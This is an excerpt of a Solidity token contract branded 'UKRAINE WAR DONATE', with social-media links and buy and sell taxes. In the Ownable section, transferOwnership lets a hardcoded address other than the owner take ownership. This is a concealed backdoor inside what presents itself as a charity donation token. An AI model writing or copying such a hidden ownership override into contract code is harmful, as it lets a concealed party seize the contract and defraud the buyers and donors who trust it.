...
// https://t.me/UKRAINEWARDONATE
// https://twitter.com/UKRAINEWARDONATE
// https://www.ukrainewardonate.co.uk
// Taxes : Buy 5% Sell 7%
...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xB30BfF0813Ad0d34154B2e6a1888479C406c1d48));
...
contract UKR_contract is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "UKRAINE WAR DONATE";
